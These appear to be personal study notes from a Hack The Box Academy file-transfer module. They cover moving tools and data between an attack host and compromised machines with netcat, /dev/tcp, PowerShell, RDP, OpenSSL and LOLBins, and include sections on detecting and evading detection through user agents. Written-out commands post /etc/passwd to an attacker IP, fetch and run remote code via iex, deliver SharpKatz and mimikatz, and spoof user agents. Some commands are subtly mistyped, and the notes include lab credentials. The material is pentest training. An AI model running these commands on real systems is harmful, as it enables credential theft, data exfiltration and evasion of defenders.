C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
\\Upload Operation using Python3
-we should understand the functions in a particular programing language to perform the upload operation. the Python3 request module allow send HTTP request (GET,POST,PUT,etc) using python 
\\Starting the python uploadserver Module
$python3 -m uploadserver
\\Uploading a File Using a Python One-liner 
$python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"file":open("/etc/passwd","rb")})'
import requests: to use the requests function, 
URL= "http://<ip>/path" define the target URL where file uploaded
file-open("/etc/passwd","rb") define the file we want to read open it and save it in a variable
r = requests.post(url,files={"files":file})   use a request POST request to upload the file
we can do the same with any other programming language.
<test> 10.129.161.215
Connect to the target machine via SSH (Username: htb-student | Password:HTB_@cademy_stdnt!)
 and practice various file transfer operations (upload and download) with your attack host. Type "DONE" when finished.
$ssh htb-student@10.129.161.215  HTB_@cademy_stdnt!
onthepawn$python3 -m uploadserver  > upload file $$python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"file":open("/etc/passwd","rb")})'
\\===================================================Miscellaneous File Transfer methods
other alternative methods such as transferring files using Netcat, Ncat and using RDP and PowerShell sessions.
\\Netcat (nc)
is computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations
-> new Ncat a modern reimplementation that supports SSL,IPv6,SOCKS and HTTP proxies, connection brokening, etc
NOTE: Ncat is used in HackTheBox's PwnBox as nc, ncat, netcat
\\File Transfer with Netcat and Ncat
the target or atking machine can be used to initiate the conn,  which is helpful if a firewall prevents access to the target, let create an ex and transfer a tool to our target
Step> start netcat (nc) on the compromised pc, listening with option -l, selectng port -p 8000, and redirect the stdout uisng > <filename>
\\NetCat - Compromised PC- listening on Port 8000
$nc -l -p 8000 > <filename>
-if the compromissed PC is using Ncat, we'll need to specify --recv-only to chose the conn once the file transfer is finished
\\Ncat-Compromissed Pc -listening on Port 8000
&ncat -l -p 8000 --recv-only > <filename>
from atk host >connect to the compromissed pc on port 8000 using netcat and send the file as input to netcat 
option -q 0 will tell Netcat to close the connection once it finishes 
\\Netcat - Attack Host - Sending File to Compromised pc
$wget -q https:////github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
$nc -q 0 192.168.49.128 8000 < SharpKatz.exe
\\Ncat - Attack Host - Sending File to Compromised pc
$ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
--instead of listening on our compro pc, we can conn to a port on our atk host to perform the file transfer operation. this method is useful in scenarios where there's a firewall blocking inbout conn.
\\Atk Host - Sending File as Input to Netcat
$sudo nc -l -p 443 -q 0 < SharpKatz.exe
\\Compromised pc conn to Netcat to Receive the File
nc 192.168.49.128 443 > SharpKatz.exe
\\Atk Host - Sending File as Input to Ncat
$sudo ncat -l -p 443 --send-only < SharpKatz.exe
\\Compromised pc conn to Ncat to receive the File
$ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
NOTE in case we dont have NetCat or Ncat on compromised pc Bash support read/write operations on a pseudo-device file /dev/TCP/
writing to this file makes Bash open a TCP conn to host:port, and this feature may be used for file transfers
\\NetCat -Sending File as Input to Netcat
$sudo nc -l -p 443 -q 0 < SharpKatz.exe
\\Ncat - Sending File as Input to Ncat
$sudo ncat -l -p 443 --send-only < SharpKatz.exe
\\Compromised PC conn to Netcat Using /dev/tcp to Receive the File
$cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
NOTE: the same operation can be used to transfer files from the compromised host to our pwnbox
\\PowerShell Session File Transfer
incase HTTP, HTTPS, or SMB are unavailable. we can use PowerShell Remoting, aka WinRM, to perform file transfer oeprations.
-PowerShell Remoting allows us to execute scripts or commands on a remote computer using Powershell sessions.
bydefault enabling PS remoting creates both an HTTP and an HTTPS listener, the listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS
-to create PS remoting session on a remote comp, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PS remoting in the session config 
EX transfer a file from DC01 to DATABASE01 and vice versa
-we have a session as Administrator in DC01 the user has administrative rights on DATABASE01, and PS remoting is enabled.
let use Test-NetConnection to confirm we can connect to WinRM
\\From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01
$whoami >hostname> Test-NetConnection -ComputerName DATABASE01 -Port 5985
-because this session already has privileges over DATABASE01, we dont need to specify cred. in the ex below: a session is created to the remote comp named DATABASE01 and stores the result in the variable named $Session
\\Create a PowerShell Remoting Session to DATABASE01
$Session = New-PSSession -ComputerName DATABASE01
-we can use the Compy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa
\\Copy samplefile.txt from our Localhost to the DATABASE01 session
$Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
\\Copy DATABASE.txt from DATABASE01 session to our Localhost
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
\\\\RDP
use right click copy and paste it into RDP session
-if we are conn from Linux we can use xfreerdp or rdesktop,at the time of writing it allow copy from our target machine to the RDP session, but there maybe scenarios where this may not work as expected
-alternative t copy and paste, we can mount a local resource on target RDP server, rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session
\\Mounting a Linux Folder Using rdesktop
$rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
\\Mounting a Linux Folder Using xfreerdp
$xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
-to access the dir we can conn to \\tsclient allow us to transfer files to and from the RDP session
-alternative, from windows, the native mstsc.exe remote desktop client can be used
-after selecting the drive, we can interact with it in the remote session that follows
NOTE: this drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session
<test>Use xfreerdp or rdesktop to connect to the target machine via RDP
 (Username: htb-student | Password:HTB_@cademy_stdnt!) 
and mount a Linux directory to practice file transfer operations (upload and download) with your attack host. Type "DONE" when finished.
$xfreerdp /v:<ip> /u:htb-student /p:<password>
>whoami>hostname> $Test-NetConnection -ComputerName <name> -Port 5985
>$Session = New-PSSession -ComputerName <name>
10.129.221.186 (window)  10.10.15.86 (linux)
rdesktop 10.129.221.186 -d HTB -u htb-student -p 'HTB_@cademy_stdnt!' -r disk:linux='/home/htb-ac-1577360/Desktop/SharpKatz.exe'
\\\\\=====================================
protected File transfers
it essential to encrypt data or use encrypted data conn such as SSH, SFTP, and HTTPS, hwer sometimes these options are not available to us, and diff approach is required
-encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transition
-data leakage during a pentest could have severe consequences for the pentest their company, and the client, as information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment
\\File Encryption on Windows.
-try Invoke-AESEncryption.ps1 ps script. this scrpt is small and provides encryption of files and strings
\\Invoke-AESEncryption.ps1
$Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
-encrypt the string "Secret test" and output a Base64 encoded ciphertext
$Invoke-AESEcryption -Mode Decrypt -Key "p@ssw0rd" -Text "adsdadadadada"
-Decrypt the base64 encoded string out put in plain text
$Invoke-AESEncryption -Mode Encrypt -Key "p@ssword" -Path file.bin
-Encrypts the file "file.bin" and output an encrypted file "file.bin.aes"
$Invoke -AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.AESEcryption
-decrypt te file ... and out put an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
-we can use any previously shown file transfer methods to get this file onto a target host. after the script has been transferred it only needs to be imported as a module, as
\\Import Module Invoke-AESEncryption.ps1
$PS C:\htb Import-Module .\Invoke-AESEncryption.ps1
after the script is imported, it can encrypt strings or files, as shown in the following ex, this command creates an encrypted file with the same name as the encrypted file but with the extension ".aes"
\\File Encryption EX
$ C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
try to use very strong and unique passwor
\\File Encryption on Linux
OpenSSL is frequently included in Linux distrobutions, with sysadmins using it to generate security certificates, among other task. OpenSSL can be used to send files "nc Style" to encrypt files
-to encrypt using openssl we can select diff ciphers, https://docs.openssl.org/1.1.1/man1/enc/
-lets use -aes256 as an ex we can also overide the default iterations counts with the option -iter 100000 and add the option -pbkdf2 to use the password-based key derivation function2 algorithm 
\\Encrypting /etc/passwd with openssl
$open enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
\\Decrypt passwd.enc with openssl
$openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
NOTE: it's recommended to use a secure transport method such as HTTPS, SFTP, SSH, 
\\\\\\\\\\\\\\=============================================
Catching Files over HTTP/s
\\HTTP/s
http/https are the most common protocols allowed through firewalls. Another immense benefit is that, in many casesm the file will be encrypted in transit. 
\\Nginx - Enabling PUT
alternative for apache. it config is less complicated, and the module system does not lead to security issues as Apache can.
-when allowing HTTP uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. Apache makes it easy to shoot ourselves in the foot with this
-as PHP module love to execute anything ending in PHP. config Nginx to use PHP is nowhere near as simple
\\Create a Dir to handle uploaded Files
$sudo mkdir -p /var/www/upload/SecreteUploadDirectory
\\Change the Owner to www-data
$sudo chown -R www-data:www-data /var/www/load/SecreteUploadDirectory
\\Craete Nginx configuration file
Create the Nginx config file by creating the file /etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
\\Symlink our Site to the sites-enabled Dir
$sudo -ln -s /etc/nginx/sites-avaiable/upload.conf /etc/nginx/sites-enabled/
\\Start Nginx
$sudo systemctl restart nginx.service
log are logged in /var/log/nginx/error.log
\\verifying Errors
$tail -2 /var/log/nginx/error.log
$ss -lnpt | grep 80
$ps -ef | grep 2811
\\Remove NginxDefault config
$sudo rm /etc/nginx/sites-enabled/ 
> try to uplading using cURL to send a PUT request 
\\Upload File using cURL
$curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/user.txt
$sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.
\\\\\\\\\\\\\\\\\\\=====================================
living off the land
was coined by Christopher Campbell 
the term LOLBins(living off the land binaries) came from a twitter dicussion on what to call binaries that an atk can use to perform actions beyond their original purpose.
https://lolbas-project.github.io/
https://gtfobins.github.io/
-it can be used to perform functions such as:
Download Upload Command Execution File Read File Write Bypasses
\\Using the LOLBAS and GTFOBins project
search for binaries we can usse for diff functions
\\LOLBAS
let use CertReq.exe as an examples > we need to listen on a port on our atk for imcoming traffic using Netcat and then execute certreq.exe to upload a file
\\Upload Win.ini to our pwnbox
c:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\Windows\win.ini
this will send the file to our Netcat session, and we can copy-paste its contents/
\\File Received in our Netcat Session
$sudo nc -lvnp 8000
-if get an error when running certreq.exe the ver using may not contain the -Post para. download an updated version
\\GTFOBins
to search and download and upload func in https://gtfobins.github.io/
-we can use +file download or +file upload
-let use OpenSSL https://www.openssl.org/ it's frequently installed and often included in other soft distribution, with sysadmins using it to generate security certificates, among other tasks, OpenSSL can be used to send files "nc stle"
\\Create certificate in our pwnbox
$openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
\\Stand up the Server in our Pwnbox
$openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
>> with the server running, we need to download the file from the compromised machine
\\Download File from the Compromised machine
$openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
\\Other Common Living off the Land tools
\\Bitsadmin Download function
the https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal
can be used to download files from HTTP sites and SMB shares. it "intelligently" checks host and network ultilization into account to minimize the impact on a user's foreground work
\\File Download with Bitsadmin
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\User\htb-student\Desktop\nc.exe
\\Download
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe -Destination "C:\Windows\Temp\nc.exe"
\\Certutil
casey smith (@subTee) found that Certutil can be used to download arbitrary files, it is avail in all windows ver, and has been a popular file transfer tech, serving as a defacto wget for Windows.
hwer the Antimalware scan interface (AMSI) currently detects this as malicious Certutil usage
\\Download a File with Certutil
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
\\Download a File with Certutil
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
\\Extra practice
persuing the LOLBAS and GTFOBins websites and experiment with as many file transfer methods as possible. the more obscure the better,
-we never know when we need one of these binaries during an assessment, and it'll save time if you already have detailed notes on mutiple options. 
some of the binaries that can be leveraged for file transfer may surprise us
<test>Connect to the target machine via RDP
 ((Username: htb-student | Password:HTB_@cademy_stdnt!)) and use Living Off The Land techniques 
 presented in this section or any other found on the LOLBAS and GTFOBins websites to transfer
  files between the Pwnbox and the Windows target. Type "DONE" when finished.
  10.129.254.157 (Win)   10.10.15.85 (linux)
$$xfreerdp /v:<ip> /u:htb-student /p:<password>
PS> certreq.exe -Post -config http://10.129.254.157:8000/ c:\windows\win.ini
$sudo nc -lvnp 8000
\\\\\\=================================================
Detection
-Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation hwer although the process of whitelisting all command line in a particular environment is initailly time comsuming.
is very robust and allows for quick detection and alerting on any unusual command lines.
-Most client-serve protocols require the client and server to negotiate how content will be delivered before exchanging infor. this is common with the http protocol. there is a need for interoperability amongst diff web svr and web broswer types to ensure tat users have the same exp no matter their browser.HTTP client is connecting to it. for EX firefox, chrome, etc
-user agents are not only used to identify web browsers, but anything acting as an HTTP client and conn to a web svr via HTTP can have a user agent string (ie cURL, a custom python scrip, or common tools such as sqlmap, or Nmap)
-org can take some steps to identify potential user agent strings by first building a list of known legitimate user agent string. user agent used by default OS processes. common user agents used by update services such as Windows update, and antivirus updates, etc. these can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. 
-this https://useragentstring.com/index.php
-malicious file transfer can also be detecte by their user agents\
\\Invoke-WebRequest-Client
PS:> C:\htb Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
PS:> C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
\\Invoke-WebRequest-Server
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
\\WinHttpRequest - Client
PS> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS>$h.open('GET','http://10.10.10.32/nc.exe',$false);
PS>$h.send();
PS>iex $h.ResponseText
\\WinHttpRequest-Server
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
\\Msxml2-client
PS>$h-New-Object -ComObject Msxml2.XMLHTTP
PS>$h.open('GET','http://10.10.10.32/nc.exe',$false);
PS>$h.send();
PS>iex $h.ResponseText
\\Msxml2-Server
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
\\Certutil-Client
PS>certutil -urlcache -split -f http://10.10.10.32/nc.exe
PS>certutil -verifyctl -split -f http://10.10.10.32/nc.exe
\\Certutil-Server
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
\\BITS-Client
PS>Import-Module bitstransfer;
PS>Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS>$r=gc $env:temp\t;
PS>rm $env:temp\t;
PS>iex $r 
\\BITS-Server
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
\\\\\\\\\\\\\\\\\\\\================================
Evading Detection
\\Changing user agent
in-case diligent admin or difenders have blacklisted any of these user agent.Invoke-WebRequest contain a UserAgent para, which allow for changing the default user agent to one emulating IE,Firebox,Chrome,opera,or safari
EX: chrome is internally, setting this User agent may make the request seem legitimate
\\Listing out User agents
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent
\\Request With Chrome User Agent
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
$nc -lvnp 80
\\LOLBAS / GTFOBins
Application whitelisting may prevent us using Powershell or Netcat, and command-line logging may alert defenders to you presence
-in such case an option maybe to user a LOLBIN (living off the land binary) alternate know as "misplaced trust binaries".
and ex is the intell graphic driver for windows 10 (GfxDownloadWrapper.exe) innstalled on some sysyems and contains functionality to download config files periodically. this download fucn can be invoked 
\\Transferring File with GfxDownloadWrapper.exe
PS>GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "c:\Temp\nc.exe"
